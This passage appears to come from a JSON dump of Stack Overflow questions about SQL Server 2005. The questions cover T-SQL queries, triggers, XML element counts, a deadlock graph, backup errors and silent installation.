count(distinct(RepID))\nfrom Reptable   \nwhere Month(Date) = @Month\ngroup by Datepart(week, Date)\n</code></pre>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":2,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":47,"score":2,"question_id":12919928,"title":"tsql to return the datafile for an index","body":"<p>I have 3 data files for the Primary filegroup of a database in SQL Server 2005.  Is it possible to determine which data file a particular index resides on, or do they live in more than one datafile within the filegroup?</p>\n"},{"tags":["sql","sql-server","sql-server-2005","datediff"],"answer_count":3,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":97,"score":3,"question_id":12894991,"title":"Removing weekends from a SQL result","body":"<p>I have the following query that produces a number of results for me. One of which is the number of days old each of the records is. </p>\n\n<p>I need a more accurate figure now by removing weekends from the equation. Not sure how to proceed and struggling to understand answers I have found. My query so far is:</p>\n\n<pre><code>select\n    i.incidentnumber,\n    i.priority, \n    i.status, \n    i.subject,\n    i.actualsystem, \n    t.ownerteam, \n    convert(varchar,i.createddatetime,103)[Created],\n    convert(varchar,i.lastmoddatetime,103)[Modified], \n    datediff(day,i.createddatetime,{fn now()})[Days old],\n    datediff(mi,i.createddatetime,{fn now()})[Minutes old],\n    cast(i.createddatetime\n    i.owner\nfrom \n    incident i with (nolock) inner join task t with (nolock) on t.parentlink_recid = i.recid\nwhere \n    i.status &lt;&gt; 'Closed' \n    and i.actualsystem &lt;&gt; 'System Administration' \n    --and i.service &lt;&gt; 'Service Request'\n    and t.status in ('Active','Waiting','Accepted') \n    --and t.ownerteam &lt;&gt; 'UK Service Desk'\n\norder by \n    --t.ownerteam asc\n    --i.actualsystem asc\n    datediff(day,i.createddatetime,{fn now()}) desc\n</code></pre>\n\n<p>I am using SQL server manager and querying a 2005 database. I comment out as necessary. The minutes old is a new column added today. Can anyone help?</p>\n"},{"tags":["sql","sql-server-2008","sql-server-2005"],"answer_count":2,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":73,"score":2,"question_id":12915765,"title":"Continue inserting data in temporary table when met exception in SQL Server 2005 (also for 2008)","body":"<p>I have 2 simple tables</p>\n\n<pre><code>+------|---------|----------+\n+  ID  |  Value  |   Test   +\n+------|---------|----------+\n+  3   |   Test  |   12345  +\n+  4   |  MyVal  |   56789  +\n+  5   |  Another|   101010 +\n+------|---------|----------+\n\n\n\n+------|---------|----------+\n+  ID  |  Value  |   Test   +\n+------|---------|----------+\n+  3   |   Test  |   12345  +\n+  7   |  MyVal12|   56789  +\n+  5   |  Another|   101010 +\n+------|---------|----------+\n</code></pre>\n\n<p>The <code>ID</code> from both tables are primary keys.</p>\n\n<p>In my stored procedure, I create a temporary table like this:</p>\n\n<pre><code>CREATE TABLE #tempTable(\n        ID int NOT NULL PRIMARY KEY NONCLUSTERED,\n        FIELD VARCHAR(255))\n</code></pre>\n\n<p>and the part of my procedure stored with <code>try-catch</code> block:</p>\n\n<pre><code>BEGIN TRY\nINSERT INTO #tempTable(ID, FIELD)\nEXEC sp_executesql @myCustomSql, @paramList, @param1, @param2 ...\nEND TRY\n\nBEGIN CATCH\n      // what to put here ?\nEND CATCH\n</code></pre>\n\n<p>I want to add rows to my temporary table (you'll see the duplicates for ID = 3 and 5) and I want to continue adding. Finally I want to have the following content for table:</p>\n\n<pre><code>+------|---------+\n+  ID  |  FIELD  +\n+------|---------+\n+  3   |   Test  +\n+  4   |  MyVal  +\n+  5   |  Another+ \n+  7   |  MyVal12+\n+------|---------+\n</code></pre>\n\n<p>I gave here a simplified example, in my database I have over one hundred thousand rows and many columns.</p>\n\n<p>Thanks</p>\n"},{"tags":["sql-server-2005","triggers"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":42,"score":0,"question_id":12916463,"title":"Insert deleted rows in trigger","body":"<p>I need to insert the deleted rows from table Table_A to Table_B which have the same structure<br>\n(something like recycle bin) but i don't have much experience in SQL SERVER Triggers  </p>\n\n<pre><code>CREATE TRIGGER dbo.Table_A_Delete_Instead_Of_Trigger\nON dbo.Table_A\nINSTEAD OF DELETE\nAS\nBEGIN    \n     INSERT INTO Table_B \n     SELECT T \n\n     DELETE T                  \nEND\n</code></pre>\n\n<p>please spare my lake of experience. Thanks.</p>\n"},{"tags":["sql-server","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":1139,"score":1,"question_id":5741212,"title":"SQL needed: sum over values by month","body":"<p>i have  an table   with values like this:</p>\n\n<pre><code>count1   count2  count3  month\n12        1       4       01/12/2011\n6         5       4       23/12/2011\n14        6       9       11/06/2011\n8         5       4       19/06/2011\n</code></pre>\n\n<p>How do I get the following results?</p>\n\n<pre><code>count1   count2  count3  month\n18        6       8       12\n22        11      13      06\n</code></pre>\n"},{"tags":["sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":56,"score":0,"question_id":12914662,"title":"cannot run linked server query with sa account but can run with windows authentication user","body":"<p>I have created a linked server(for excel) and when I run the query like below</p>\n\n<p>It works when I connect SQL Server Management Studio with windows authentication and run the below query.</p>\n\n<pre><code>select * from linkserver...sheet1$\n</code></pre>\n\n<p>The same query gets the following error if I login with sa account.</p>\n\n<pre><code> The OLE DB provider \"Microsoft.ACE.OLEDB.12.0\" for linked server \"exportlink\"\n reported an error. The provider did not give any information about the error.\n Msg 7303, Level 16, State 1, Line 1\n Cannot initialize the data source object of OLE DB provider   \n \"Microsoft.ACE.OLEDB.12.0\" for     linked server \"linkedserver\n</code></pre>\n\n<p>Though it seems a security issue, I don't know how to fix it. </p>\n"},{"tags":["sql","sql-server","sql-server-2005","stored-procedures"],"answer_count":7,"favorite_count":2,"up_vote_count":11,"down_vote_count":1,"view_count":48688,"score":10,"question_id":170328,"title":"Executing a stored procedure within a stored procedure","body":"<p>I would like to execute a stored procedure within a stored procedure eg </p>\n\n<pre><code>EXEC SP1\n\nBEGIN\n\nEXEC SP2\nEND\n</code></pre>\n\n<p>But I only want SP1 to finish after SP2 has finished running so I need to find a way for SP1 to wait for SP2 to finish before SP1 ends.</p>\n\n<p>Thanks</p>\n"},{"tags":["sql-server","sql-server-2005","tsql","sql-server-2008","insert"],"answer_count":11,"favorite_count":3,"up_vote_count":17,"down_vote_count":0,"view_count":24711,"score":17,"question_id":2624713,"title":"How do I insert multiple rows WITHOUT repeating the \"INSERT INTO dbo.Blah\" part of the statement?","body":"<p>I know I've done this before years ago, but I can't remember the syntax, and I can't find it anywhere due to pulling up tons of help docs and articles about \"bulk imports\".</p>\n\n<p>Here's what I want to do, but the syntax is not exactly right... please, someone who has done this before, help me out :)</p>\n\n<pre><code>INSERT INTO dbo.MyTable (ID, Name)\nVALUES (123, 'Timmy'),\n    (124, 'Jonny'),\n    (125, 'Sally')\n</code></pre>\n\n<p>I know that this is <em>close</em> to the right syntax. I might need the word \"BULK\" in there, or something, I can't remember. Any idea?</p>\n\n<p>EDIT: Particularly, I need this for a SQL Server 2005 database. I've tried this code, to no avail:</p>\n\n<pre><code>DECLARE @blah TABLE\n(\n    ID INT NOT NULL PRIMARY KEY,\n    Name VARCHAR(100) NOT NULL\n)\n\nINSERT INTO @blah (ID, Name)\n    VALUES (123, 'Timmy')\n    VALUES (124, 'Jonny')\n    VALUES (125, 'Sally')\n\nSELECT * FROM @blah\n</code></pre>\n\n<p>I'm getting <code>Incorrect syntax near the keyword 'VALUES'.</code></p>\n"},{"tags":["sql-server","sql-server-2005","command-line","installation"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":36,"score":0,"question_id":12909340,"title":"Error in Commandline Installation of SQL Server 2005 Express SP 3","body":"<p>I am facing a strange issue while installing SQL Server Express 2005 on Windows XP SP3 (German OS) machine.</p>\n\n<p>PFB the description:</p>\n\n<ol>\n<li>I am performing a silent installation of SQL Server 2005 via a .bat file.</li>\n<li><p>The installation command is as following :</p>\n\n<pre><code>start /wait Setup.exe /qn INSTANCENAME=&lt;instance name&gt; ADDLOCAL=SQL_Engine SAPWD=\"strong password&gt;\" SECURITYMODE=SQL SQLACCOUNT=\"NT-AUTORITÄT\\SYSTEM\" DISABLENETWORKPROTOCOLS=0 TARGETDIR=\"C:\\Program Files\\Microsoft SQL Server \\\" \n</code></pre></li>\n<li><p>The SQLACCOUNT parameter is derived at run-time be checking the language of the OS. In English, it is \"NT AUTHORITY\\SYSTEM\" .In German, it is \"NT-AUTORITÄT\\SYSTEM\"</p></li>\n<li><p>If I provide the above command directly to the command line, then installation is successful. But, if I put the same command in the bat file, then installation fails.</p></li>\n<li><p>The reason for failure mentioned in the log files is that the system is not able to recognize the local system account.</p></li>\n<li>In the log files, I checked that when the passed parameter is \"NT-AUTORITÄT\\SYSTEM\" then, SQL logs contain the name of the parameter as \"NT-AUTORIT-T\\SYSTEM\".\nThis parameter is invalid and hence, the installation is failing.</li>\n</ol>\n\n<p><img src=\"http://i.stack.imgur.com/2kmzd.jpg\" alt=\"Screenshot for different scenarios\"></p>\n\n<p>I also tried providing the \".\\LocalSystem\" as the parameter but, still installation fails.</p>\n\n<p>Please Note:</p>\n\n<p>I faced a similar issue while installing SQL Server 2008 Express on the same machine.\nI changed the installation command from \"NT-AUTORITÄT\\SYSTEM\" to \"NT AUTHORITY\\SYSTEM\", then the issue was solved.</p>\n"},{"tags":["xml","sql-server-2005","grouping"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":27,"score":1,"question_id":12908455,"title":"Obtain a count of XML elements per group in SQL","body":"<p>I have an XML column that looks something like the following;</p>\n\n<pre><code>DECLARE @str AS VARCHAR(8000)\n\nSET @str = '&lt;Root xmlns=\"http://myurl.com/services/\" xmlns:i=\"http://www.w3.org/2001/XMLSchema-instance\"&gt;\n           &lt;Notifications&gt;\n               &lt;Notification&gt;\n                  &lt;NotificationDate&gt;2012-08-16&lt;/NotificationDate&gt;\n                  &lt;Scopes&gt;\n                    &lt;NotificationScope&gt;\n                        &lt;Code&gt;a&lt;/Code&gt;\n                    &lt;/NotificationScope&gt;  \n                    &lt;NotificationScope&gt;\n                        &lt;Code&gt;b&lt;/Code&gt; \n                    &lt;/NotificationScope&gt;\n                  &lt;/Scopes&gt;\n                &lt;/Notification&gt;\n                &lt;Notification&gt;\n                  &lt;NotificationDate&gt;2012-08-20&lt;/NotificationDate&gt;\n                  &lt;Scopes&gt;\n                    &lt;NotificationScope&gt;\n                        &lt;Code&gt;a&lt;/Code&gt;\n                    &lt;/NotificationScope&gt;\n                  &lt;/Scopes&gt;\n                &lt;/Notification&gt;\n            &lt;/Notifications&gt;&lt;/Root&gt;'\n</code></pre>\n\n<p>I want to be able to get a count of the number of NotificationScope Elements per notification. So for example, I am looking for something like;</p>\n\n<pre><code>Notification Date                   Count\n 2012-08-16                          2\n 2012-08-20                          1\n</code></pre>\n\n<p>In fact, as in reality as this data is obtained from a database column, I am really only interested in returning those records that have ANY Notification Date with a Count that is greater than 1. </p>\n\n<p>So far, all I've managed to come up with is the following, but that just gives me a count of ;</p>\n\n<pre><code>declare @xmlvar XML;\nset @xmlvar = (SELECT cast(@str AS XML))\n;WITH XMLNAMESPACES('http://myurl.com/services/' AS p)\nSELECT * FROM (\nselect @xmlvar.value('count(/p:Root/p:Notifications/p:Notification/p:Scopes/p:NotificationScope)', 'INT') AS 'NotificationScopeCount',\n       @xmlvar.value('count(/p:Root/p:Notifications/p:Notification/p:NotificationDate)', 'INT') AS 'NotificationDateCount'\n ) a WHERE NotificationScopeCount &gt; NotificationDateCount\n</code></pre>\n\n<p>but ideally, I'd like to be able to get the associated date also. Please forgive me if this is a horrible way of going about this, I haven't used XML datatypes much before in SQL. </p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":9,"favorite_count":6,"up_vote_count":30,"down_vote_count":1,"view_count":81463,"score":29,"question_id":576441,"title":"Insert all values of a table into another table in SQL","body":"<p>I am trying to insert all values of one table into another. But the insert statement accepts values, but i would like it to accept a select * from the initial_Table. Is this possible?</p>\n"},{"tags":["sql-server-2005","common-table-expression","data-type-conversion"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":38,"score":0,"question_id":12900527,"title":"CTE data conversion error - Fine with temp tables","body":"<p>So, I have a CTE that's throwing the error: <code>Msg 8114, Level 16, State 5, Line 1 Error converting data type nvarchar to float.</code>  The problem is that if I break down the CTE into temp tables, everything runs fine!</p>\n\n<p>Below is a slight simplification of what I'm doing (data types are accurate, I just renamed things, created bogus data, removed a couple extra joins and where clauses that don't seem to effect the error, etc.)... note that this sample does work correctly, which just adds to my confusion:</p>\n\n<pre><code>--Build and populate sample data\ncreate table vals\n(\n    groupID int,\n    valName nvarchar(50),\n    val     nvarchar(50)\n)\ninsert into vals(groupID, valName, val)\nselect 1, 'setting1', '12:00' union\nselect 1, 'setting2', '18:00' union\nselect 1, 'setting3', '3.2' union\nselect 2, 'setting1', '9:00' union\nselect 2, 'setting3', '4' union\nselect 2, 'setting5', 'steve'\n\ncreate table collected\n(\n    groupID int,\n    timeUTC datetime,\n    collected float\n)\ninsert into collected(groupID, timeUTC, collected)\nselect 1, '2012-09-12 18:00', 2.8 union\nselect 1, '2012-09-12 18:30', 3.0 union\nselect 1, '2012-09-12 19:00', 3.3 union\nselect 1, '2012-09-12 19:30', 4.0 union\nselect 1, '2012-09-12 20:00', 2.5 union\nselect 2, '2012-09-12 18:00', 3.5 union\nselect 2, '2012-09-12 18:30', 3.9 union\nselect 2, '2012-09-12 19:00', 4.6 union\nselect 2, '2012-09-12 19:30', 4.2 union\nselect 2, '2012-09-12 20:00', 4.3\n\n\n--Here's the CTE that errors on the actual dataset\n;with triggerVal as (\n    select groupID,\n        [trg] = min(cast(val as float))\n    from vals\n    where valName = 'setting3'\n    group by groupID\n), currentVal as (\n    select c.groupID, c.timeUTC,\n        [curr] = c.collected\n    from collected c\n        join (\n            select groupID, [lastTime] = max(timeUTC)\n            from collected\n            group by groupID\n        ) l on c.groupID=l.groupID\n            and c.timeUTC = l.lastTime\n)\nselect t.groupID, c.timeUTC, t.trg, c.curr\nfrom triggerVal t\n    join currentVal c on t.groupID=c.groupID\n</code></pre>\n\n<p>Again, in my live data, if I break the above CTE into temp tables (<code>#triggerVal</code> and <code>#currentVal</code>) everything runs fine.  While it's not the end of the world for me to modify my code, I'd really like to understand what's happening!</p>\n"},{"tags":["tsql","sql-server-2005"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":65,"score":0,"question_id":11265868,"title":"How to Order By Column when Column isn't of the same type?","body":"<p>I have fields in the column that look like so:</p>\n\n<pre><code>2/8B, 3, 3/8B, 4/8B, 2, 6, 4/9, 9, 8/9, 8, 7, 1, 5/9, 10, 3/9, 2/9, 7/9, 6/8B, 6/9, 1/9, 5, 8B, 5/8B, 4\n</code></pre>\n\n<p>I need to sort this list in a manner like: </p>\n\n<pre><code>1, 1/9, 2, 2/8B, 2/9, 3, 3/8B, 3/9, 4, 4/8B, 4/9, 5, 5/8B, 5/9, 6, 6/8B, 6/9, 7, 7/9, 8, 8/9, 8B, 9, 10\n</code></pre>\n\n<p>How do I Order By to create this output?</p>\n\n<p>To clear up any confusion (1/2) is not a fraction. the \"/\" is just a separator. </p>\n"},{"tags":["c#","sql-server","sql-server-2005","linq-to-sql"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":87,"score":1,"question_id":11992498,"title":"Why isn't DataContext not updating with external database changes?","body":"<p>If I change data within Microsoft SQL Server Management Studio while my application is running, LINQ will not get the new data, even if I run</p>\n\n<pre><code>myContext.Refresh(System.Data.Linq.RefreshMode.OverwriteCurrentValues)\n</code></pre>\n\n<p>The only way to get the new changes (that I've found so far...) is to recreate the data context.</p>\n\n<pre><code>myContext.Dispose();\nmyContext = new MyDataContext();\n</code></pre>\n\n<p>I must be blind and this has to be really obvious, but I've wasted enough time on this to allow myself to post this dumb question... -_-''</p>\n\n<p>Thanks!</p>\n\n<p><strong>Edit</strong></p>\n\n<p>When I load data from SQL:</p>\n\n<pre><code>myBindingSource.DataSource = myContext.myTable.Where(o =&gt; o.id != 0).OrderBy(o =&gt; o.name);\n</code></pre>\n"},{"tags":["c#","asp.net","sql-server-2005","stored-procedures"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":126,"score":0,"question_id":12857828,"title":"Pass List/ Array to stored procedure and retrieve parameters one by one in stored procedure.?","body":"<p>I have Drop Down List with check box in my asp.net page.\nin that page i am going to checked multiple / single / all values. </p>\n\n<p>now i want to pass all selected values from dropdownlist to sql server 2005 stored procedure as parameters.</p>\n\n<p>i want to Pass the array of selected values as a string, each array item separated by a ','</p>\n\n<p>And in stored procedure i want to retrieve each values one by one. \n(using split function or any better option ? ) </p>\n\n<p>and i want to process insert query on each selected parameters.</p>\n\n<p>any help please. </p>\n\n<p>I have tried This Stored Procedure.</p>\n\n<pre><code>CREATE PROCEDURE [dbo].[TEST_LIST] \n@ID_LIST VARCHAR(200)\n</code></pre>\n\n<p>AS<br>\n   DECLARE @pos        int,\n           @nextpos    int,\n           @valuelen   int</p>\n\n<p>SELECT @pos = 0, @nextpos = 1</p>\n\n<p>WHILE @nextpos > 0\n   BEGIN\n      SELECT @nextpos = charindex(',', @ID_LIST, @pos + 1)\n      SELECT @valuelen = CASE WHEN @nextpos > 0\n                              THEN @nextpos\n                              ELSE len(@ID_LIST) + 1\n                         END - @pos - 1</p>\n\n<pre><code>  INSERT INTO TABLE \n    (ID)\n     VALUES (convert(int, substring(@ID_LIST, @pos + 1, @valuelen)))\n  SELECT @pos = @nextpos\n</code></pre>\n\n<p>END\n   RETURN\nEND</p>\n\n<p>BUT IS THIS CORRECT ??</p>\n\n<p>I GOT ERROR. </p>\n\n<p>please note this > one by one i want to retrieve parameters and at each time i have insert query.</p>\n"},{"tags":["sql","sql-server-2005","triggers"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":2899,"score":2,"question_id":3454242,"title":"Will using the TABLOCK and HOLDLOCK hints in SQL Server 2005 COMPLETELY prevent inserts until the end of the transaction?","body":"<p>I need to retrieve the identity field generated by SQL Server 2005. Usually I would just use SCOPE_IDENTITY or add an OUTPUT CLAUSE to the insert, however neither of these method help in this situation: as there is an INSTEAD OF trigger attached to the table. Next I considered @@IDENTITY, but as there is also another trigger attached to the table, this is no good either. So I figured I'd have to use IDENT_CURRENT. However as this is not session safe I need some way to ensure no other session can insert into the table until I have retrieved the new ID. I've experimented with using the TABLOCK and HOLDLOCK hints, this seems to work, but I'm not a DBA. So my question is, will using the TABLOCK and HOLDLOCK hints in SQL Server 2005 COMPLETELY prevent inserts until the end of the transaction?</p>\n\n<p>Hopefully this contrived example will explain the situation. (I realise that, functionally,  a stored procedure could replace both the triggers in this case.)</p>\n\n<pre><code>CREATE TABLE Person\n(\n PersonID  INT IDENTITY PRIMARY KEY,\n FirstName VARCHAR(50)\n);\nGO\n\nCREATE TABLE PersonHistory\n(\n PersonHistoryID INT IDENTITY(5,1) PRIMARY KEY,\n PersonId INT,\n FirstName VARCHAR(50)\n);\nGO\n\nCREATE TRIGGER PersonAudit ON Person\nAFTER Insert\nAS\nINSERT INTO PersonHistory (PersonID, FirstName)\nSELECT Inserted.PersonID, Inserted.FirstName\nFROM Inserted;\nGO\n\nCREATE TRIGGER PersonCleaner ON Person\nINSTEAD OF Insert\nAS\nINSERT INTO Person (FirstName)\nSELECT UPPER(Inserted.FirstName)\nFROM Inserted;\nGO\n\nBEGIN TRAN;\n\nINSERT INTO Person WITH (TABLOCK, HOLDLOCK) (FirstName) \nVALUES ('George');\n\n--SELECT @@IDENTITY AS '@@IDENTITY'; -- 5 \n--SELECT IDENT_CURRENT('Person') AS 'IDENT_CURRENT'; -- 1\n--SELECT SCOPE_IDENTITY() AS 'SCOPE_IDENITIY'; -- NULL\n\nDECLARE @PersonID int;\nSELECT @PersonID = IDENT_CURRENT('Person');\nSELECT @PersonID; -- 1\n\nCOMMIT TRAN;\n\n--SELECT * FROM Person;\n--SELECT * FROM PersonHistory;\n\nDROP TABLE Person;\nDROP TABLE PersonHistory;\n</code></pre>\n"},{"tags":["sql","tsql","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":96,"score":3,"question_id":12887988,"title":"Select data by date and sum data - SQL Server 2005","body":"<p>I'm coming from MySQL and trying to code T-SQL on SQL Server 2005, and I'm finding it completely different.</p>\n\n<p>Here's what I want to do (using MySQL)</p>\n\n<pre><code>select sum(datapoint) as sum, date(mytimestamp) as date\nfrom datalog\nwhere datapoint = '27'\ngroup by date\n</code></pre>\n\n<p>i.e. get a list of data summed and grouped by date.</p>\n"},{"tags":["sql","sql-server","sql-server-2005","tsql"],"answer_count":4,"favorite_count":5,"up_vote_count":9,"down_vote_count":0,"view_count":6846,"score":9,"question_id":1427469,"title":"Compare dates in T-SQL, ignoring the time part","body":"<p>I'm using MS SQL 2005, and I want to check two dates for equality, but ignoring the time part.</p>\n\n<p>I know I can make use of <a href=\"http://msdn.microsoft.com/en-us/library/ms189794.aspx\">DATEDIFF</a>, but am concerned that it may be slow - this SP gets used in the DB a lot!</p>\n\n<p>Any suggestions?</p>\n\n<p><b>Edit:</b> David Andres' comment: <blockquote>'\"comparison\" includes much more than equality' </blockquote> made me realise that I didn't make my question clear enough - I am actually just checking for equality, that is all.</p>\n"},{"tags":["sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":227,"score":2,"question_id":2763295,"title":"what is the diffrence between truncate and delete in sql server?","body":"<p>can anybody provide me list of all diffrences between truncate and delete in SQL server?</p>\n"},{"tags":["sql-server-2005","deadlock","database-deadlocks"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":101,"score":0,"question_id":12646702,"title":"Deadlock between Delete and Update","body":"<p>First process:</p>\n\n<pre><code>&lt;deadlock-list&gt;\n &lt;deadlock victim=\"process8d9798\"&gt;\n  &lt;process-list&gt;\n   &lt;process id=\"process8d9798\" taskpriority=\"0\" logused=\"0\" waitresource=\"PAGE:\n    5:1:190354\" waittime=\"3203\" ownerId=\"53807810\" transactionname=\"DELETE\" \n    lasttranstarted=\"11:29:29.153\" XDES=\"0x3dbb518\" lockMode=\"U\" \n    schedulerid=\"2\" kpid=\"1792\" status=\"suspended\" spid=\"57\" sbid=\"0\" ecid=\"1\" \n    priority=\"0\" transcount=\"0\" lastbatchstarted=\"2012-09-28T11:29:29.120\" \n    lastbatchcompleted=\"11:29:29.120\" clientapp=\".Net SqlClient Data Provider\" \n    hostname=\"xxx\" hostpid=\"4460\" isolationlevel=\"read uncommitted (1)\" \n    xactid=\"53807810\" currentdb=\"5\" lockTimeout=\"4294967295\" clientoption1=\"671088672\" \n    clientoption2=\"128056\"&gt;\n    &lt;executionStack&gt;\n     &lt;frame procname=\"Chooser2.dbo.DeleteUserSelections\" line=\"15\" stmtstart=\"360\"\n     stmtend=\"464\" sqlhandle=\"0x030005008839117bf599a500099800000100000000000000\"&gt;\n   DELETE UserPlanOption\n    WHERE UserID = @userId     &lt;/frame&gt;\n    &lt;/executionStack&gt;\n    &lt;inputbuf&gt;\n    &lt;/inputbuf&gt;\n   &lt;/process&gt;\n</code></pre>\n\n<p>Second process:</p>\n\n<pre><code>   &lt;process id=\"processb84988\" taskpriority=\"0\" logused=\"1744\" waitresource=\"PAGE:\n    5:1:190487\" waittime=\"3203\" ownerId=\"53807415\" transactionname=\"user_transaction\" \n   lasttranstarted=\"11:29:13.513\" XDES=\"0x2fc4e6e0\" lockMode=\"IU\" \n   schedulerid=\"4\" kpid=\"4628\" status=\"suspended\" spid=\"52\" sbid=\"0\" ecid=\"0\" \n   priority=\"0\" transcount=\"2\" lastbatchstarted=\"11:29:13.513\" \n   lastbatchcompleted=\"11:29:13.513\" \n   clientapp=\".Net SqlClient Data Provider\" hostname=\"xxx\" \n   hostpid=\"4460\" loginname=\"chooserpd\" isolationlevel=\"read uncommitted (1)\" \n   xactid=\"53807415\" currentdb=\"5\" lockTimeout=\"4294967295\" clientoption1=\"671088672\" \n   clientoption2=\"128056\"&gt;\n    &lt;executionStack&gt;\n     &lt;frame procname=\"Eligibility\" line=\"149\" stmtstart=\"10566\" \n   stmtend=\"11604\" sqlhandle=\"0x03000500171b4f52c1a6e200ada000000100000000000000\"&gt;\nUPDATE  UserPlanOption \n    SET     RateID = r.ID\n    FROM    [User] u WITH (NOLOCK)\n        LEFT JOIN Rate r ON r.FamilyTierID = u.FamilyTierID \n    WHERE   UserPlanOption.PlanOptionID NOT IN (SELECT ppo.PlanOptionID FROM \n                    @PORACPlanOptions ppo) AND\n        u.ID = @userID AND u.ID = UserPlanOption.UserID AND\n        r.PlanOptionID = UserPlanOption.PlanOptionID AND\n        r.Criterion1 = dbo.GetPlanOptionAreaID_36()\n      &lt;/frame&gt;\n    &lt;/executionStack&gt;\n    &lt;inputbuf&gt;\nProc [Database Id = 5 Object Id = 1380915991]    &lt;/inputbuf&gt;\n   &lt;/process&gt;\n  &lt;/process-list&gt;\n</code></pre>\n\n<p>Resource list:</p>\n\n<pre><code>  &lt;resource-list&gt;\n   &lt;pagelock fileid=\"1\" pageid=\"190354\" dbid=\"5\" objectname=\"UserPlanOption\" \n   id=\"lock1e482d80\" mode=\"IX\" associatedObjectId=\"72057594060996608\"&gt;\n    &lt;owner-list&gt;\n     &lt;owner id=\"processb84988\" mode=\"IX\"/&gt;\n    &lt;/owner-list&gt;\n    &lt;waiter-list&gt;\n     &lt;waiter id=\"process8d9798\" mode=\"U\" requestType=\"wait\"/&gt;\n    &lt;/waiter-list&gt;\n   &lt;/pagelock&gt;\n   &lt;pagelock fileid=\"1\" pageid=\"190487\" dbid=\"5\" objectname=\"UserPlanOption\" \n   id=\"lock25b32a80\" mode=\"U\" associatedObjectId=\"72057594060996608\"&gt;\n    &lt;owner-list&gt;\n     &lt;owner id=\"process8d9798\" mode=\"U\"/&gt;\n    &lt;/owner-list&gt;\n    &lt;waiter-list&gt;\n     &lt;waiter id=\"processb84988\" mode=\"IU\" requestType=\"wait\"/&gt;\n    &lt;/waiter-list&gt;\n   &lt;/pagelock&gt;\n  &lt;/resource-list&gt;\n &lt;/deadlock&gt;\n&lt;/deadlock-list&gt;\n</code></pre>\n\n<p>The table \"UserPlanOption has a composite PK (UserId and PlanOptionId). Why does the delete cause a page lock? Can someone help me understand what is going on? What confused me for a while was that I thought the deadlock would be caused by subsequent queries from the same client, but that's not possible. These must be different clients hitting the same web page.</p>\n\n<p>Actually, I guess I know the answer to the first question - deleting a range will require a page lock. But how can I get around this?</p>\n\n<p>Results from index query:</p>\n\n<pre><code>name                type type_desc is_unique data_space_id ignore_dup_key \n------------------- ---- --------- --------- ------------- -------------- \nPK_UserPlanOption_1 1    CLUSTERED 1         1             0              \n\n\nis_primary_key is_unique_constraint fill_factor is_padded is_disabled \n-------------- -------------------- ----------- --------- ----------- \n1              0                    0           0         0           \n\nis_hypothetical allow_row_locks allow_page_locks\n--------------- --------------- ----------------\n0               1               1\n</code></pre>\n\n<p>Execution plans for the <a href=\"http://heeroz.com/update.sqlplan\" rel=\"nofollow\">update</a> and the <a href=\"http://heeroz.com/delete.sqlplan\" rel=\"nofollow\">delete</a>.</p>\n"},{"tags":["sql-server-2005"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":6,"view_count":44,"score":-6,"question_id":12880717,"title":"How to install SQL SeErver 2005 Express on x64 windows 7","body":"<p>I have a windows 7 home premium 64-bit laptop and I  want to install SQL Server 2005 Express edition engine for windows 7 x64  how can I install?</p>\n\n<p>Please provide download link &amp; installation guide</p>\n"},{"tags":["sql-server-2005","business-intelligence","sql-server-2012"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":6,"view_count":41,"score":-6,"question_id":12880744,"title":"Data migration = how?","body":"<p>If a company need to do some data migration from SQL Server 2005 to 2012 included SSIS, SSRS and SSAS.</p>\n\n<p>How should I do it and what best practice do you suggest?</p>\n\n<p>Please remember that I'm a newbie in data migration.</p>\n\n<p>The company has about 2000 employer and they use SQL server only.</p>\n"},{"tags":["sql","sql-server-2005","backup","database-backups"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":483,"score":0,"question_id":11472366,"title":"SQL Server Backup (not restore!) error: The media set has 2 media families but only 1 are provided. All members must be provided","body":"<p>I am running into this error when trying to Backup a database:</p>\n\n<blockquote>\n  <p>\"The media set has 2 media families but only 1 are provided. All\n  members must be provided.\"</p>\n</blockquote>\n\n<p>Please note this is on BACKUP not on restore.</p>\n\n<p>There are a lot of topics on this error for RESTORE, but I didn't find any for BACKUP.</p>\n\n<p>I am using this T.SQL on Sql Server 2005:</p>\n\n<pre><code>backup database dtplog\nTO DISK='e:\\dtplog.bak'\n</code></pre>\n\n<p>So it looks like SQL Server has some kind of setting specified there are multiple backup devices for this database.</p>\n\n<p>For some databases I don't get this error, but for some I do.</p>\n\n<p>Any idea what's happening?</p>\n"},{"tags":["sql","sql-server","tsql","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":59,"score":3,"question_id":12875480,"title":"How can I pass @VAR + magic numbers to a stored procedure parameter in a sql script?","body":"<p>Lets say I have a stored proc call <code>MyStoredProc</code> which recieved an int <code>(@MyParam INT)</code> datatype.</p>\n\n<p>Let's say I have an int declared in a script like this...</p>\n\n<pre><code>DECLARE @MyVar INT ;\nSET @MyVar = 101 ;\n</code></pre>\n\n<p>I just wrote a long sql script where I do a LOT of this...</p>\n\n<pre><code>EXEC MyStoredProc @MyVar + 1  